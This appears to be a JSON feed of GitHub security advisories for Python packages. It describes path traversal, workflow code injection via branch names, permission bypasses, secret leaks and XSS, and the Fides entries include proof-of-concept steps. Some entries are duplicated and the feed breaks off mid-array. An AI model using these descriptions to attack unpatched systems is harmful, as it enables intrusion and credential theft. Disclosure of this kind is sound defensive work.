{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>A path traversal vulnerability was identified in the parisneo/lollms-webui repository, specifically within version 9.6. The vulnerability arises due to improper handling of user-supplied input in the 'list_personalities' endpoint. By crafting a malicious HTTP request, an attacker can traverse the directory structure and view the contents of any folder, albeit limited to subfolder names only. This issue was demonstrated via a specific HTTP request that manipulated the 'category' parameter to access arbitrary directories. The vulnerability is present in the code located at the 'endpoints/lollms_advanced.py' file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4330\">https://nvd.nist.gov/vuln/detail/CVE-2024-4330</a></li>\n<li><a href=\"https://github.com/ParisNeo/lollms/commit/0e52d59a06b7f05e3b2611ce7b053fafa44143a9\">https://github.com/ParisNeo/lollms/commit/0e52d59a06b7f05e3b2611ce7b053fafa44143a9</a></li>\n<li><a href=\"https://huntr.com/bounties/154a78d5-3960-4fc6-8666-f982b5e70ed7\">https://huntr.com/bounties/154a78d5-3960-4fc6-8666-f982b5e70ed7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9p73-x86v-jw57\">https://github.com/advisories/GHSA-9p73-x86v-jw57</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9p73-x86v-jw57",
            "title": "[lollms] path traversal vulnerability was identified in the parisneo/lollms-webui ",
            "date_modified": "2024-06-02T22:30:26.000Z",
            "date_published": "2024-06-02T22:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9p73-x86v-jw57"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A code injection vulnerability exists in the huggingface/text-generation-inference repository, specifically within the <code>autodocs.yml</code> workflow file. The vulnerability arises from the insecure handling of the <code>github.head_ref</code> user input, which is used to dynamically construct a command for installing a software package. An attacker can exploit this by forking the repository, creating a branch with a malicious payload as the name, and then opening a pull request to the base repository. Successful exploitation could lead to arbitrary code execution within the context of the GitHub Actions runner. This issue affects versions up to and including v2.0.0 and was fixed in version 2.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3924\">https://nvd.nist.gov/vuln/detail/CVE-2024-3924</a></li>\n<li><a href=\"https://github.com/huggingface/text-generation-inference/commit/88702d876383f7200eccf67e28ba00500dc804bb\">https://github.com/huggingface/text-generation-inference/commit/88702d876383f7200eccf67e28ba00500dc804bb</a></li>\n<li><a href=\"https://huntr.com/bounties/8af92fc2-0103-4d29-bb28-c3893154c422\">https://huntr.com/bounties/8af92fc2-0103-4d29-bb28-c3893154c422</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qq99-p57r-g3v7\">https://github.com/advisories/GHSA-qq99-p57r-g3v7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qq99-p57r-g3v7",
            "title": "[text-generation] code injection vulnerability exists in the huggingface/text-generation-inference repository",
            "date_modified": "2024-06-02T22:30:18.000Z",
            "date_published": "2024-06-02T22:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qq99-p57r-g3v7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Due to an improperly applied permission check in the <code>wagtail.contrib.settings</code> module, a user with access to the Wagtail admin and knowledge of the URL of the edit view for a settings model can access and update that setting, even when they have not been granted permission over the model. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions have been released as Wagtail 6.0.5 and 6.1.2. Wagtail releases prior to 6.0 are unaffected.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround is available.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>Many thanks to Victor Miti for reporting this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Visit Wagtail's <a href=\"https://docs.wagtail.io/en/stable/support.html\">support channels</a></li>\n<li>Email us at <a href=\"mailto:security@wagtail.org\">security@wagtail.org</a> (view our <a href=\"https://github.com/wagtail/wagtail/security/policy\">security policy</a> for more information).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wagtail/wagtail/security/advisories/GHSA-xxfm-vmcf-g33f\">https://github.com/wagtail/wagtail/security/advisories/GHSA-xxfm-vmcf-g33f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35228\">https://nvd.nist.gov/vuln/detail/CVE-2024-35228</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/284f75a6f91f7ab18cc304d7d34f33b559ae37b1\">https://github.com/wagtail/wagtail/commit/284f75a6f91f7ab18cc304d7d34f33b559ae37b1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xxfm-vmcf-g33f\">https://github.com/advisories/GHSA-xxfm-vmcf-g33f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xxfm-vmcf-g33f",
            "title": "[wagtail] Improper Handling of Insufficient Permissions in `wagtail.contrib.settings`",
            "date_modified": "2024-06-02T22:28:29.000Z",
            "date_published": "2024-06-02T22:28:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xxfm-vmcf-g33f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Due to an improperly applied permission check in the <code>wagtail.contrib.settings</code> module, a user with access to the Wagtail admin and knowledge of the URL of the edit view for a settings model can access and update that setting, even when they have not been granted permission over the model. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions have been released as Wagtail 6.0.5 and 6.1.2. Wagtail releases prior to 6.0 are unaffected.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround is available.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>Many thanks to Victor Miti for reporting this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Visit Wagtail's <a href=\"https://docs.wagtail.io/en/stable/support.html\">support channels</a></li>\n<li>Email us at <a href=\"mailto:security@wagtail.org\">security@wagtail.org</a> (view our <a href=\"https://github.com/wagtail/wagtail/security/policy\">security policy</a> for more information).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wagtail/wagtail/security/advisories/GHSA-xxfm-vmcf-g33f\">https://github.com/wagtail/wagtail/security/advisories/GHSA-xxfm-vmcf-g33f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35228\">https://nvd.nist.gov/vuln/detail/CVE-2024-35228</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/284f75a6f91f7ab18cc304d7d34f33b559ae37b1\">https://github.com/wagtail/wagtail/commit/284f75a6f91f7ab18cc304d7d34f33b559ae37b1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xxfm-vmcf-g33f\">https://github.com/advisories/GHSA-xxfm-vmcf-g33f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xxfm-vmcf-g33f",
            "title": "[wagtail] Improper Handling of Insufficient Permissions in `wagtail.contrib.settings`",
            "date_modified": "2024-06-02T22:28:29.000Z",
            "date_published": "2024-06-02T22:28:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xxfm-vmcf-g33f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Sentry's Slack integration incorrectly records the incoming request body in logs. This request data can contain sensitive information, including the <a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#deprecation\">deprecated Slack verification token</a>. With this verification token, it is possible under specific configurations, an attacker can forge requests and act as the Slack integration.</p>\n<p>The request body is leaked in log entries matching <code>event == \"slack.*\" &amp;&amp; name == \"sentry.integrations.slack\" &amp;&amp; request_data == *</code>. The deprecated slack verification token, will be found in the <code>request_data.token</code> key.</p>\n<p>Example event:</p>\n<pre><code class=\"language-json\">{\n    \"name\": \"sentry.integrations.slack\",\n    \"level\": \"info\",\n    \"event\": \"slack.event.message\",  # This could be any of the `slack.*` events\n    \"request_data\": {\n      # Other keys are omitted for brevity\n      \"token\": \"&lt;MyDeprecatedSlackVerificationToken&gt;\",\n    }\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li><strong>SaaS users</strong> do not need to take any action.</li>\n<li><strong>Self-hosted users</strong> should upgrade to version 24.5.0 or higher, <a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#regenerating\">rotate their Slack verification token</a>, and <a href=\"https://develop.sentry.dev/integrations/slack/\">use the Slack Signing Secret instead of the verification token</a>.<ul>\n<li>If you are only using the <code>slack.signing-secret</code> in your self-hosted configuration, then the legacy verification token is not used to verify the webhook payload. It is ignored.</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>⚠️ Sentry's support for validating Slack requests via the legacy verification token will be deprecated in version 24.7.0.</p>\n</blockquote>\n<h3 id=\"workarounds\">Workarounds</h3>\n<h4 id=\"option-1\">Option 1</h4>\n<p>Set the <code>slack.signing-secret</code> instead of <code>slack.verification-token</code>. The <a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#app-management-updates\">signing secret</a> is Slack's recommended way of authenticating webhooks.</p>\n<p>By having <code>slack.singing-secret</code> set, Sentry self-hosted will no longer use the verification token for authentication of the webhooks, regardless of whether <code>slack.verification-token</code> is set or not.</p>\n<h4 id=\"option-2\">Option 2</h4>\n<p>The deprecated Slack verification token is leaked in log levels of <code>INFO</code> and <code>ERROR</code> in the Slack integration. If the self-hosted instance is unable to be upgraded or re-configured to use the <code>slack.signing-secret</code>, the logging configuration can be adjusted to not generate logs from the integration. The <a href=\"https://github.com/getsentry/sentry/blob/17d2b87e39ccd57e11da4deed62971ff306253d1/src/sentry/conf/server.py#L1307\">default logging configuration can be found in <code>src/sentry/conf/server.py</code></a>. <strong>Services should be restarted once the configuration change is saved.</strong></p>\n<p>Below you'll find an example of the configuration adjustments necessary to remove the Slack integration logs:</p>\n<pre><code class=\"language-python\"># src/sentry/conf/server.py\n\n...\n \nLOGGING: LoggingConfig = {\n    ...\n    handlers: {\n        # the line below already exists in the default configuration\n        \"null\": {\"class\": \"logging.NullHandler\"},\n        ...\n    },\n    \"loggers\": {\n        \"sentry.integrations.slack\": {\n            \"handlers\": [\"null\"],  # route logs to null handler\n            \"level\": \"CRITICAL\",  # prevent generation of logs a lower levels (ex. ERROR and INFO)\n        },\n        ...\n    },\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry/pull/70508\">https://github.com/getsentry/sentry/pull/70508</a></li>\n<li><a href=\"https://develop.sentry.dev/integrations/slack/\">Sentry Slack Integration Documentation for Self-Hosted users</a></li>\n<li><a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#app-management-updates\">Documentation on Slack Signing Secrets</a></li>\n<li><a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#deprecation\">Slack Deprecation for Verification Tokens</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry/security/advisories/GHSA-c2g2-gx4j-rj3j\">https://github.com/getsentry/sentry/security/advisories/GHSA-c2g2-gx4j-rj3j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35196\">https://nvd.nist.gov/vuln/detail/CVE-2024-35196</a></li>\n<li><a href=\"https://github.com/getsentry/sentry/pull/70508\">https://github.com/getsentry/sentry/pull/70508</a></li>\n<li><a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#app-management-updates\">https://api.slack.com/authentication/verifying-requests-from-slack#app-management-updates</a></li>\n<li><a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#deprecation\">https://api.slack.com/authentication/verifying-requests-from-slack#deprecation</a></li>\n<li><a href=\"https://api.slack.com/authentication/verifying-requests-from-slack#regenerating\">https://api.slack.com/authentication/verifying-requests-from-slack#regenerating</a></li>\n<li><a href=\"https://develop.sentry.dev/integrations/slack\">https://develop.sentry.dev/integrations/slack</a></li>\n<li><a href=\"https://github.com/getsentry/sentry/blob/17d2b87e39ccd57e11da4deed62971ff306253d1/src/sentry/conf/server.py#L1307\">https://github.com/getsentry/sentry/blob/17d2b87e39ccd57e11da4deed62971ff306253d1/src/sentry/conf/server.py#L1307</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c2g2-gx4j-rj3j\">https://github.com/advisories/GHSA-c2g2-gx4j-rj3j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c2g2-gx4j-rj3j",
            "title": "[sentry] Slack integration leaks sensitive information in logs",
            "date_modified": "2024-06-02T22:28:10.000Z",
            "date_published": "2024-06-02T22:28:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c2g2-gx4j-rj3j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Fides webserver has a number of endpoints that retrieve <code>ConnectionConfiguration</code> records and their associated <code>secrets</code> which <em>can</em> contain sensitive data (e.g. passwords, private keys, etc.). These <code>secrets</code> are stored encrypted at rest (in the application database), and the associated endpoints are not meant to expose that sensitive data in plaintext to API clients, as it could be compromising. </p>\n<p>Fides's developers have available to them a Pydantic field-attribute (<code>sensitive</code>) that they can annotate as <code>True</code> to indicate that a given secret field should not be exposed via the API. The application has an internal function that uses <code>sensitive</code> annotations to mask the sensitive fields with a <code>\"**********\"</code> placeholder value.</p>\n<p>This vulnerability is due to a bug in that function, which prevented <code>sensitive</code> API model fields that were <em>nested</em> below the root-level of a <code>secrets</code> object from being masked appropriately. Only the <code>BigQuery</code> connection configuration secrets meets these criteria: the secrets schema has a nested sensitive <code>keyfile_creds.private_key</code> property that is exposed in plaintext via the APIs.</p>\n<p>Connection types other than <code>BigQuery</code> with sensitive fields at the root-level that are not nested are properly masked with the placeholder and are not affected by this vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The Google Cloud secrets used for a Fides BigQuery integration may be retrieved in plaintext by any authenticated Admin UI user, except those with the Approver role. Any API users authorized to access the following endpoints may also retrieve the key in plaintext.</p>\n<p>Endpoints impacted:</p>\n<ul>\n<li><code>GET /api/v1/connections</code></li>\n<li><code>PATCH /api/v1/connections</code></li>\n<li><code>GET /api/v1/connection/{connection_key}</code></li>\n<li><code>PATCH /api/v1/system/{system_key}/connection</code></li>\n<li><code>GET /api/v1/system/{system_key}</code></li>\n<li><code>GET /api/v1/system/{system_key}/connection</code></li>\n</ul>\n<p>Connection config secret schemas impacted:</p>\n<ul>\n<li><code>BigQuerySchema</code></li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in Fides version <code>2.37.0</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>\n<p>Users are also advised to rotate any Google Cloud secrets used for BigQuery integrations in their Fides deployments: <a href=\"https://cloud.google.com/iam/docs/key-rotation\">https://cloud.google.com/iam/docs/key-rotation</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds.</p>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Multiple endpoints are impacted, but this PoC will use <code>GET /api/v1/system/{system_key}</code> as an example.</p>\n<ol>\n<li>Using the Admin UI, navigate to <code>/add-systems</code>. Add and save a new system <code>bq_poc</code>.</li>\n<li>In the integrations tab of the new system, configure and save a BigQuery integration with secrets.</li>\n<li>Log in as a different user with any role except Approver and navigate to the <code>/systems</code> page.</li>\n<li>Open the network section of your browser's developer tools.</li>\n<li>Click on the <code>bq_poc</code> system's meatball menu and then click edit.</li>\n<li>In the network section of browser dev tools you will observe a HTTP GET <a href=\"http://localhost:8080/api/v1/system/bq_poc/\">http://localhost:8080/api/v1/system/bq_poc/</a> request. In the body of the JSON response the integration secrets values entered in Step 2 are exposed in plaintext i.e.</li>\n</ol>\n<pre><code class=\"language-json\">{\n  \"secrets\": {\n    \"keyfile_creds\": {\n      \"type\": \"value\",\n      \"project_id\": \"value\",\n      \"private_key_id\": \"value\",\n      \"private_key\": \"value\",\n      \"client_email\": \"value\",\n      \"client_id\": \"value\",\n      \"auth_uri\": \"value\",\n      \"token_uri\": \"value\",\n      \"auth_provider_x509_cert_url\": \"value\",\n      \"client_x509_cert_url\": \"value\"\n    }\n  }\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethyca/fides/security/advisories/GHSA-rcvg-jj3g-rj7c\">https://github.com/ethyca/fides/security/advisories/GHSA-rcvg-jj3g-rj7c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35189\">https://nvd.nist.gov/vuln/detail/CVE-2024-35189</a></li>\n<li><a href=\"https://cloud.google.com/iam/docs/key-rotation\">https://cloud.google.com/iam/docs/key-rotation</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rcvg-jj3g-rj7c\">https://github.com/advisories/GHSA-rcvg-jj3g-rj7c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rcvg-jj3g-rj7c",
            "title": "[ethyca-fides] Sensitive Data Disclosure Vulnerability in Connection Configuration Endpoints",
            "date_modified": "2024-06-02T22:28:03.000Z",
            "date_published": "2024-06-02T22:28:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rcvg-jj3g-rj7c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>A user with permissions to view Dynamic Group records (<code>extras.view_dynamicgroup</code> permission) can use the Dynamic Group detail UI view (<code>/extras/dynamic-groups/&lt;uuid&gt;/</code>) and/or the members REST API view (<code>/api/extras/dynamic-groups/&lt;uuid&gt;/members/</code>) to list the objects that are members of a given Dynamic Group. </p>\n<p>In versions of Nautobot between 1.3.0 (where the Dynamic Groups feature was added) and 1.6.22 inclusive, and 2.0.0 through 2.2.4 inclusive, Nautobot fails to restrict these listings based on the member object permissions - for example a Dynamic Group of Device objects will list all Devices that it contains, regardless of the user's <code>dcim.view_device</code> permissions or lack thereof.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>Fixed in Nautobot 1.6.23 and 2.2.5.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>This vulnerability can be partially mitigated by removing <code>extras.view_dynamicgroup</code> permission from users; a full fix will require upgrading.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36112\">https://nvd.nist.gov/vuln/detail/CVE-2024-36112</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6\">https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e\">https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q",
            "title": "[nautobot] Nautobot dynamic-group-members doesn't enforce permission restrictions on member objects",
            "date_modified": "2024-05-29T18:40:56.000Z",
            "date_published": "2024-05-29T18:40:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>A user with permissions to view Dynamic Group records (<code>extras.view_dynamicgroup</code> permission) can use the Dynamic Group detail UI view (<code>/extras/dynamic-groups/&lt;uuid&gt;/</code>) and/or the members REST API view (<code>/api/extras/dynamic-groups/&lt;uuid&gt;/members/</code>) to list the objects that are members of a given Dynamic Group. </p>\n<p>In versions of Nautobot between 1.3.0 (where the Dynamic Groups feature was added) and 1.6.22 inclusive, and 2.0.0 through 2.2.4 inclusive, Nautobot fails to restrict these listings based on the member object permissions - for example a Dynamic Group of Device objects will list all Devices that it contains, regardless of the user's <code>dcim.view_device</code> permissions or lack thereof.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>Fixed in Nautobot 1.6.23 and 2.2.5.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>This vulnerability can be partially mitigated by removing <code>extras.view_dynamicgroup</code> permission from users; a full fix will require upgrading.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36112\">https://nvd.nist.gov/vuln/detail/CVE-2024-36112</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6\">https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e\">https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q",
            "title": "[nautobot] Nautobot dynamic-group-members doesn't enforce permission restrictions on member objects",
            "date_modified": "2024-05-29T18:40:56.000Z",
            "date_published": "2024-05-29T18:40:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Fides webserver requires a connection to a hosted PostgreSQL database for persistent storage of application data. If the password used by the webserver for this database connection includes special characters such as <code>@</code> and <code>$</code>, webserver startup fails and the part of the password following the special character is exposed in webserver error logs.</p>\n<p>This is caused by improper escaping of the SQLAlchemy password string, see <a href=\"https://docs.sqlalchemy.org/en/14/core/engines.html#escaping-special-characters-such-as-signs-in-passwords\">here</a> and <a href=\"https://github.com/sqlalchemy/sqlalchemy/discussions/6615\">here</a> for more info.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Partial exposure of hosted database password in webserver logs</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in Fides version <code>2.37.0</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds.</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<ol>\n<li>Create a hosted PostgreSQL database for Fides with a password including <code>@</code> or <code>$</code> e.g. <code>p@ssword</code></li>\n<li>Run Fides and observe failure, sample log attached</li>\n</ol>\n<pre><code>fides  | 2024-02-28 14:27:52.609 | ERROR    | fides.api.db.database:configure_db:117 - Unable to configure database: sqlalchemy.exc.OperationalError: (psycopg2.OperationalError) could not translate host name \"ssword@fides-db\" to address: Name or service not known\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethyca/fides/security/advisories/GHSA-8cm5-jfj2-26q7\">https://github.com/ethyca/fides/security/advisories/GHSA-8cm5-jfj2-26q7</a></li>\n<li><a href=\"https://github.com/ethyca/fides/commit/6ab37b1ffe2b1a3bd35b706a82f78e061086141c\">https://github.com/ethyca/fides/commit/6ab37b1ffe2b1a3bd35b706a82f78e061086141c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34715\">https://nvd.nist.gov/vuln/detail/CVE-2024-34715</a></li>\n<li><a href=\"https://docs.sqlalchemy.org/en/14/core/engines.html#escaping-special-characters-such-as-signs-in-passwords\">https://docs.sqlalchemy.org/en/14/core/engines.html#escaping-special-characters-such-as-signs-in-passwords</a></li>\n<li><a href=\"https://github.com/sqlalchemy/sqlalchemy/discussions/6615\">https://github.com/sqlalchemy/sqlalchemy/discussions/6615</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8cm5-jfj2-26q7\">https://github.com/advisories/GHSA-8cm5-jfj2-26q7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8cm5-jfj2-26q7",
            "title": "[ethyca-fides] Fides Webserver Logs Hosted Database Password Partial Exposure Vulnerability",
            "date_modified": "2024-05-31T20:44:41.000Z",
            "date_published": "2024-05-29T15:25:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8cm5-jfj2-26q7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Multiple forms in version &lt;0.0.21 allowed injection of HTML elements.\nThese are returned to the user after executing job actions and thus evaluated by the browser.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We recommend to upgrade to version &gt;= <a href=\"https://github.com/ansibleguy/webui/releases/tag/0.0.21\">0.0.21</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ansibleguy/webui/files/15358522/Report.pdf\">Report</a></li>\n<li><a href=\"https://github.com/ansibleguy/webui/issues/44\">GitHub Issue 44</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ansibleguy/webui/security/advisories/GHSA-927p-xrc2-x2gj\">https://github.com/ansibleguy/webui/security/advisories/GHSA-927p-xrc2-x2gj</a></li>\n<li><a href=\"https://github.com/ansibleguy/webui/commit/7737b47e7f7ddbfec7b1418c724598363718d522\">https://github.com/ansibleguy/webui/commit/7737b47e7f7ddbfec7b1418c724598363718d522</a></li>\n<li><a href=\"https://github.com/ansibleguy/webui/files/15358522/Report.pdf\">https://github.com/ansibleguy/webui/files/15358522/Report.pdf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-927p-xrc2-x2gj\">https://github.com/advisories/GHSA-927p-xrc2-x2gj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-927p-xrc2-x2gj",
            "title": "[ansibleguy-webui] ansibleguy-webui Cross-site Scripting vulnerability",
            "date_modified": "2024-05-28T21:23:42.000Z",
            "date_published": "2024-05-28T21:23:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-927p-xrc2-x2gj"
            },
            "tags": [
                "severity"
            ]
        },
        {
